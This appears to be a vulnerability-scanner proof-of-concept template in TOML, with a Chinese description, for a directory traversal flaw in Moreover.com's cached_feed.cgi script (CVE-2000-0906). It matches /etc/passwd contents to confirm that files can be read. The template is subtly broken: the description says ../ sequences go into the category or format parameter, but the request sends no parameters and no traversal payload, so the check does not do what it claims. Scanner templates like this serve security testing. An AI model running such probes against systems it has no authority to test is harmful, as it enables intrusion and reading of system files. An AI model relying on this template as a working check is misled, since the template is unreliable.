[info]
author = "AVE"
description = "检测 Moreover.com cached_feed.cgi 脚本（版本 4.July.00）中的目录遍历漏洞。通过向 category 或 format 参数传入 ../ 序列，验证是否存在路径穿越导致任意文件读取。"
id = "POC-AVE-2000-0661"
name = "Moreover cached_feed.cgi 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0661"]
vuln_id = [
    "CVE-2000-0906",
    "AVE-2000-0661",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cached_feed.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "bin:",
    "daemon:",
]

